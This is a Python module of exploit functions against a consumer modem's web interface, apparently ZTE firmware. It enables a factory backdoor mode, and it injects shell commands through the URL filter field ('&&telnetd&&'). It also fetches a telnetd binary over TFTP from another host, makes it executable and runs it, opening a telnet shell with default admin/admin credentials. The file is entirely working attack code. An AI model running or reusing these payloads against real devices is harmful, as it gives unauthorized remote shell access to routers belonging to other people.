import base64
import json
from urllib.parse import quote

from src.http_client import post


def factory_backdoor(modem_ip, password):
    """Enable factory backdoor (Method 2 prerequisite). Returns True on success."""
    encoded = base64.b64encode(password.encode()).decode()
    data = f"isTest=false&goformId=CHANGE_MODE&change_mode=2&password={encoded}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"


def exploits_nvram(modem_ip):
    """Inject telnetd via URL filter NVRAM exploit. Starts telnetd on port 4719."""
    payload = "http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"
    data = f"isTest=false&goformId=URL_FILTER_ADD&addURLFilter={payload}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"


def tftp_telnetd(modem_ip, tftp_ip="192.168.0.22"):
    """Fetch and start telnetd via TFTP using zte_debug.sh. Listens on port 23 (admin/admin)."""
    filter_str = f"http://aa&zte_debug.sh {tftp_ip} telnetd"
    data = f"isTest=false&goformId=URL_FILTER_ADD&addURLFilter={quote(filter_str)}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"


def tftp_telnetd_direct(modem_ip, tftp_ip="192.168.0.22"):
    """Fetch and start telnetd via raw busybox tftp (fallback if zte_debug.sh absent)."""
    filter_str = (
        f"http://aa&tftp -g -r telnetd -l /tmp/telnetd {tftp_ip}"
        f"&&chmod +x /tmp/telnetd&&/tmp/telnetd"
    )
    data = f"isTest=false&goformId=URL_FILTER_ADD&addURLFilter={quote(filter_str)}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"
